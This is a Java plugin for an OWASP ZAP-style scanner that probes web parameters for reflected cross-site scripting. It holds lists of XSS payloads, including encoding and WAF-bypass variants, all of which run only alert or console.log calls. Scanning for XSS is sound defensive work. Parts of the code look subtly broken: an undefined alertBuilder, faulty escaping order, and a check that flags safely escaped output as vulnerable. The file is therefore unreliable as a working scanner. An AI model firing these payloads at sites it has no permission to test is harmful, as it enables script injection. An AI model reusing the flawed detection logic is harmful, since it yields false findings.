package com.saas_security.security_modules;

import org.parosproxy.paros.core.scanner.*;
import org.parosproxy.paros.network.*;
import org.zaproxy.zap.model.*;
import java.util.*;

/**
 * Advanced XSS Scanner adapted from ZAP's XSS testing capabilities
 */
public class XssScanner extends AbstractAppParamPlugin {
    
    private static final int XSS_PLUGIN_ID = 40012; // ZAP's Cross Site Scripting (Reflected) ID
    
    // XSS payloads organized by context and bypass technique
    private static final String[] BASIC_XSS_PAYLOADS = {
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<script>document.body.innerHTML='XSS'</script>",
        "javascript:alert('XSS')",
        "onload=alert('XSS')",
        "onfocus=alert('XSS')",
        "onerror=alert('XSS')",
        "onmouseover=alert('XSS')",
        "<iframe src=javascript:alert('XSS')>",
        "<embed src=javascript:alert('XSS')>",
        "<object data=javascript:alert('XSS')>",
        "<link rel=stylesheet href=javascript:alert('XSS')>",
        "<style>@import javascript:alert('XSS')</style>",
        "<math><script>alert('XSS')</script></math>",
        "<svg/onload=alert('XSS')>"
    };
    
    private static final String[] ENCODED_XSS_PAYLOADS = {
        "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
        "%253Cscript%253Ealert%28%27XSS%27%29%253C%252Fscript%253E",
        "%25253Cscript%25253Ealert%28%27XSS%27%29%25253C%25252Fscript%25253E",
        "<script>alert(\"XSS\")</script>",
        "<ScRipt>alert(\"XSS\")</ScRiPt>",
        "<s%00cript>alert(\"XSS\")</s%00cript>",
        "<script\x20>alert(\"XSS\")</script>",
        "<script\x0D>alert(\"XSS\")</script>",
        "<script\x0A>alert(\"XSS\")</script>",
        "<script\x0C>alert(\"XSS\")</script>"
    };
    
    private static final String[] WAF_BYPASS_PAYLOADS = {
        "<script>console.log(\"XSS\")</script>",
        "<img src=\"x\" onerror=console.log(\"XSS\")>",
        "<svg onload=console.log(\"XSS\")></svg>",
        "<iframe srcdoc=\"&lt;script&gt;console.log('XSS')&lt;/script&gt;\">",
        "<details open ontoggle=console.log(\"XSS\")>",
        "<audio src=x onerror=console.log(\"XSS\")>",
        "<video src=x onerror=console.log(\"XSS\")>",
        "<track src=x onerror=console.log(\"XSS\")>",
        "<source src=x onerror=console.log(\"XSS\")>",
        "<canvas id=canvas onload=console.log(\"XSS\")></canvas>",
        "<base href=javascript:console.log(\"XSS\")>",
        "<form action=javascript:console.log(\"XSS\")>",
        "<input type=password onfocus=console.log(\"XSS\")>",
        "<textarea onfocus=console.log(\"XSS\")></textarea>",
        "<select onfocus=console.log(\"XSS\")></select>",
        "<option onfocus=console.log(\"XSS\")>",
        "<optgroup onfocus=console.log(\"XSS\")>",
        "<fieldset onfocus=console.log(\"XSS\")>",
        "<legend onfocus=console.log(\"XSS\")>",
        "<label onfocus=console.log(\"XSS\")>",
        "<button onclick=console.log(\"XSS\")>",
        "<iframe src=data:text/html,<script>console.log(\"XSS\")</script>>",
        "<object data=javascript:console.log(\"XSS\")>",
        "<embed src=javascript:console.log(\"XSS\")>"
    };
    
    private static final String[] CONTEXT_SPECIFIC_PAYLOADS = {
        // HTML Context
        "\"><script>alert('XSS')</script>",
        "'><script>alert('XSS')</script>",
        "</script><script>alert('XSS')</script>",
        
        // Attribute Context
        "\" onmouseover=\"alert('XSS')\"",
        "' onmouseover='alert(\"XSS\")'",
        "\" onfocus=\"alert('XSS')\"",
        "' onfocus='alert(\"XSS\")'",
        
        // JavaScript Context
        "; alert('XSS'); //",
        "' + alert('XSS') + '",
        "\" + alert(\"XSS\") + \"",
        "` + ${alert('XSS')} + `",
        
        // CSS Context
        "expression(alert('XSS'))",
        "url(javascript:alert('XSS'))",
        "&apos;-moz-binding:url(\"data:text/xml;charset=utf-8,<x xmlns=%22http://www.w3.org/1999/xhtml%22><script>alert('XSS')</script></x>\");-moz-binding:url(&apos;/xss&apos;)&apos;",
        
        // XSS Context Bypasses
        "<<script>alert('XSS')<//script>",
        "<img src=\"#\" onerror=\"alert('XSS')\">",
        "<img src=\"x\" onerror=\"alert(/XSS/)\">",
        "<img src=\"x\" onerror=\"alert(String.fromCharCode(88,83,83))\">",
        "<svg/onload=alert(String.fromCharCode(88,83,83))>",
        "<svg onload=alert\\x28\\x27XSS\\x27\\x29></svg>",
        "<svg onload=alert&#40\\x27XSS\\x27&#41></svg>",
        "<svg onload=alert&amp;#40;\\x27XSS\\x27;&amp;#41></svg>",
        "<iframe src=\"data:text/html,<script>alert('XSS')</script>\"></iframe>"
    };
    
    @Override
    public int getId() {
        return XSS_PLUGIN_ID;
    }
    
    @Override
    public String getName() {
        return "Cross Site Scripting (Reflected)";
    }
    
    @Override
    public String getDescription() {
        return "Comprehensive XSS vulnerability scanner with multiple bypass techniques";
    }
    
    @Override
    public int getCategory() {
        return Category.INJECTION;
    }
    
    @Override
    public String getSolution() {
        return "User input must be properly escaped and validated before being placed in HTML context.";
    }
    
    @Override
    public String getReference() {
        return "https://owasp.org/www-community/attacks/xss/\nhttps://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html";
    }
    
    @Override
    public int getRisk() {
        return Alert.RISK_HIGH;
    }
    
    @Override
    public int getCweId() {
        return 79; // CWE-79: Cross-site Scripting
    }
    
    @Override
    public int getWascId() {
        return 8; // WASC-8: Cross Site Scripting
    }
    
    @Override
    public void init() {
        // Plugin initialization
    }
    
    @Override
    public void scan() {
        // Main scan logic
        if (isParameterReflectable()) {
            performXssScan();
        }
    }
    
    private void performXssScan() {
        List<String> payloads = generateXssPayloads();
        
        for (String payload : payloads) {
            if (isStop()) {
                break;
            }
            
            HttpMessage msg = getNewMsg();
            setParameter(msg, getBaseParamName(), payload, msg.getParamSet());
            sendAndReceive(msg);
            
            if (checkForXssVulnerability(msg, payload)) {
                return;
            }
        }
    }
    
    private List<String> generateXssPayloads() {
        List<String> payloads = new ArrayList<>();
        
        // Add different categories of payloads based on attack strength
        switch (getAttackStrength()) {
            case LOW:
                payloads.addAll(Arrays.asList(BASIC_XSS_PAYLOADS));
                break;
            case MEDIUM:
                payloads.addAll(Arrays.asList(BASIC_XSS_PAYLOADS));
                payloads.addAll(Arrays.asList(ENCODED_XSS_PAYLOADS));
                payloads.addAll(Arrays.asList(CONTEXT_SPECIFIC_PAYLOADS));
                break;
            case HIGH:
            case INSANE:
                payloads.addAll(Arrays.asList(BASIC_XSS_PAYLOADS));
                payloads.addAll(Arrays.asList(ENCODED_XSS_PAYLOADS));
                payloads.addAll(Arrays.asList(CONTEXT_SPECIFIC_PAYLOADS));
                payloads.addAll(Arrays.asList(WAF_BYPASS_PAYLOADS));
                break;
        }
        
        return payloads;
    }
    
    private boolean checkForXssVulnerability(HttpMessage msg, String payload) {
        String responseBody = msg.getResponseBody().toString();
        String responseHeaders = msg.getResponseHeader().toString();
        
        // Check if payload is reflected in response
        if (isPayloadReflected(payload, responseBody, responseHeaders)) {
            // Create alert
            Alert alert = new Alert(getRisk(), Alert.CONFIDENCE_HIGH, getName());
            alert.setDetail(getDescription(), msg.getRequestHeader().getURI().toString(),
                          getParameterName(msg), payload, "", "", responseBody,
                          HttpStatusCodeUtils.getStatusCode(msg.getResponseHeader().getStatusCode()),
                          msg.getResponseHeader().getStatusCodeReasonPhrase(), 
                          alertBuilder.getAlert(), "", "", "", "");
            
            // Set CWE and WASC
            alert.setCweId(getCweId());
            alert.setWascId(getWascId());
            alert.setSolution(getSolution());
            alert.setReference(getReference());
            
            // Raise alert
            raiseAlert(getRisk(), Alert.CONFIDENCE_HIGH, getName(), getDescription(),
                      msg.getRequestHeader().getURI().toString(), getParameterName(msg),
                      payload, "", "", responseBody, "", "", "", "");
            
            return true;
        }
        
        return false;
    }
    
    private boolean isPayloadReflected(String payload, String responseBody, String responseHeaders) {
        // Check various reflection scenarios
        return responseBody.contains(payload) ||
               responseHeaders.contains(payload) ||
               responseBody.contains(URLEncoder.encode(payload)) ||
               responseBody.contains(HTMLDecoder.decode(payload)) ||
               responseBody.contains(StringEscapeUtils.escapeHtml(payload));
    }
    
    private boolean isParameterReflectable() {
        // Check if parameter reflects in response
        HttpMessage msg = getNewMsg();
        String originalValue = msg.getParamValue(getBaseParamName());
        
        setParameter(msg, getBaseParamName(), "ZAP_XSS_TEST_REFLECTION", msg.getParamSet());
        sendAndReceive(msg);
        
        String responseBody = msg.getResponseBody().toString();
        return responseBody.contains("ZAP_XSS_TEST_REFLECTION");
    }
    
    @Override
    public boolean isStop() {
        return super.isStop();
    }
    
    // Utility classes (simplified versions of what would be in the actual implementation)
    private static class URLEncoder {
        public static String encode(String str) {
            return java.net.URLEncoder.encode(str, java.nio.charset.StandardCharsets.UTF_8);
        }
    }
    
    private static class HTMLDecoder {
        public static String decode(String str) {
            return str.replace("&lt;", "<").replace("&gt;", ">").replace("&amp;", "&");
        }
    }
    
    private static class StringEscapeUtils {
        public static String escapeHtml(String str) {
            return str.replace("<", "&lt;").replace(">", "&gt;").replace("&", "&amp;");
        }
    }
    
    private static class HttpStatusCodeUtils {
        public static String getStatusCode(int statusCode) {
            return String.valueOf(statusCode);
        }
    }
}
